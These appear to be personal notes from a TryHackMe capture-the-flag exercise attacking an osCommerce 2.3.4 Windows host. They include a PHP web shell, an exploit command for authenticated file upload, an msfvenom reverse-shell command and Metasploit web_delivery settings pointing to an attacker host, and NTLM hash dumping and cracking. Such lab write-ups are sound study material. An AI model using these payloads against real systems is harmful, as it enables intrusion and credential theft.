SO SMB is open, lets use eternal blue - ms17-010
	Not vulnerable
Lets check 80:
	Nothing there
Lets check 8080:
	We have directory listing oscommerse-2.3.4
	This is a shopping cms
	Leta get some more info
	
	It is indeed a cms, running on php as disclosed by clicking on links.

	Lets check for other hidden directories.
	It has a documentation telling /catalog os default web directory.
	Lets use gobuster for finding anything hidden.

	We found an install directory, letas check that.

	We are able to start a fresh install, and default credentials for database worked.
	its localhost:root::oscommerce
	
	Lets setup admin username and password as admin and admin

Lets search for exploits.
	We found a RCE 44374.py exploit.
	We also found File upload exploit : 43191.py
	Lets download it and see what it does.
	Lets use second one with a simple shell.php as a file to uplaod.
		contents : <?php passthru($_GET['cmd']);?> 
	
	Lets run the exploit.

	python3 43191.py -u http://10.10.75.227:8080/oscommerce-2.3.4 --auth=admin:admin -f shell.php

	Shell uploaded, lets go to url /admin/shell.php and provide parameter ?cmd=whoami

	We are authority system.
	That means we only need to get a shell back from here and we will be in full control.

	Lets create a reverse shell with msfvenom and upload it to the same folder.

	msfvenom -p windows/shell_reverse_tcp LHOST=10.9.241.177 LPORT=4444 -f exe > shell.exe

	Lets upload the same.

	Unable to upload because of encoding, lets use metasploit to get shell.

	Start msf console.

use as below

msf6 exploit(multi/script/web_delivery) > options

Module options (exploit/multi/script/web_delivery):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  10.9.241.177     yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  1234             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description

   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   3   Regsvr32


Run the exploit.

We will receive a command to run on victim, copy and run it as cmd parameter on the webshell we created.

We will receive a meterpreter session.

Navigating to admin desktop we found the flag.
THM{FLAG}

Lets dump hashes for users.

We get NTLM hash for user 
Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::

We can also use kiwi/mimikatz for the same : 30e87bf999828446a1c1209ddde4c450
	
The hash can be decrypted at crackstation : googleplus
